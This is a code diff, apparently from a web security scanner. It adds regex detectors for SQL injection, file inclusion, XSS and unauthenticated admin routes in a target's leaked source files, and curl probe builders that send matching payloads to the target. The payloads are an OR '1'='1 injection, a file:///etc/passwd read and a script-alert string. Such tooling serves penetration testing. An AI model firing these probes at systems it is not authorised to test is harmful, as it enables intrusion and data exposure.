@@ -1168,6 +1168,99 @@ export function jsSecretFindings(jsText, path) {
   return out;
 }
 
+const JS_CODE_DANGER_SIGNATURES = [
+  {
+    kind: "sqli_concat",
+    label: "SQL armado por concatenación de string",
+    cwe: "CWE-89",
+    severity: "Critical",
+    // Captures the request-param name used inside a raw/whereRaw-style
+    // string concatenation, e.g. whereRaw("code = '" . $request->code . "'").
+    re: /where[rR]aw\([\s\S]*?\.\s*\$?request(?:->|\.)(\w+)/,
+  },
+  {
+    kind: "lfi_include",
+    label: "Lectura de fichero desde entrada de usuario sin sanitizar",
+    cwe: "CWE-98",
+    severity: "Critical",
+    re: /(?:file_get_contents|include|require)\s*\(\s*\$_(?:GET|REQUEST|POST)\[['"](\w+)['"]\]/,
+  },
+  {
+    kind: "xss_unescaped_echo",
+    label: "Salida de parámetro sin escapar (echo/print directo)",
+    cwe: "CWE-79",
+    severity: "High",
+    re: /(?:echo|print)\s+\$_(?:GET|REQUEST|POST)\[['"](\w+)['"]\]/,
+  },
+  {
+    kind: "authz_missing_middleware",
+    label: "Ruta administrativa sin middleware de autenticación visible",
+    cwe: "CWE-862",
+    severity: "High",
+    re: /Route::\w+\(\s*['"](\/(?:admin|internal|staff)[^'"]*)['"]\s*,[^)]*\)(?!\s*->\s*middleware)/,
+  },
+];
+
+/**
+ * Escanea contenido fuente/config ya filtrado por el propio catálogo
+ * (.env, .git/config, source maps, backups — ver env-file/git-head/etc.
+ * en este mismo archivo) buscando patrones de código peligrosos por
+ * clase de vulnerabilidad, y devuelve hasta 5 hits con el parámetro/ruta
+ * exacto encontrado para poder construir una sonda dirigida (no genérica).
+ */
+export function extractDangerousCodePatterns(blob) {
+  const text = String(blob || "");
+  const hits = [];
+  for (const sig of JS_CODE_DANGER_SIGNATURES) {
+    const m = text.match(sig.re);
+    if (!m) continue;
+    const captured = m[1] || null;
+    hits.push({
+      kind: sig.kind,
+      label: sig.label,
+      cwe: sig.cwe,
+      severity: sig.severity,
+      snippet: m[0].slice(0, 200),
+      param: sig.kind === "authz_missing_middleware" ? null : captured,
+      route: sig.kind === "authz_missing_middleware" ? captured : null,
+    });
+    if (hits.length >= 5) break;
+  }
+  return hits;
+}
+
+const CODE_DANGER_PROBE_BUILDERS = {
+  sqli_concat: (hit, baseUrl) => ["-s", "-L", "--max-time", "15", "-G", baseUrl,
+    "--data-urlencode", `${hit.param}=x' OR '1'='1`],
+  lfi_include: (hit, baseUrl) => ["-s", "-L", "--max-time", "15", "-G", baseUrl,
+    "--data-urlencode", `${hit.param}=file:///etc/passwd`],
+  xss_unescaped_echo: (hit, baseUrl) => ["-s", "-L", "--max-time", "15", "-G", baseUrl,
+    "--data-urlencode", `${hit.param}=<script>alert(1)</script>`],
+  authz_missing_middleware: (hit, baseUrl) => {
+    const url = new URL(hit.route, baseUrl || "http://localhost").toString();
+    return ["-s", "-L", "--max-time", "15", url];
+  },
+};
+
+/**
+ * Sondas dirigidas por hallazgo de código peligroso (mirror de
+ * secretValidateCurlSteps): un hit trae ya el parámetro o ruta exactos,
+ * así que la sonda ataca ese punto en vez de repetir el catálogo genérico.
+ */
+export function codeDangerProbeSteps(step, hits, baseUrl = "") {
+  const list = Array.isArray(hits) ? hits.slice(0, 3) : [];
+  return list.map((hit, i) => {
+    const builder = CODE_DANGER_PROBE_BUILDERS[hit.kind];
+    if (!builder) return null;
+    return step(`p2-codeguided-${i + 1}`, "curl", builder(hit, baseUrl), null, {
+      desc: `Sonda dirigida por código fuente filtrado: ${hit.label} (${hit.kind})`,
+      codeDangerKind: hit.kind,
+      codeDangerCwe: hit.cwe,
+      codeDangerSeverity: hit.severity,
+    });
+  }).filter(Boolean);
+}
+
 /* ------------------------------------------------------------------------ *
  * Fingerprint de WAF/CDN (pasivo, solo cabeceras ya obtenidas) — misma
  * lógica que wafw00f: firmas conocidas en headers/cookies de la raíz.
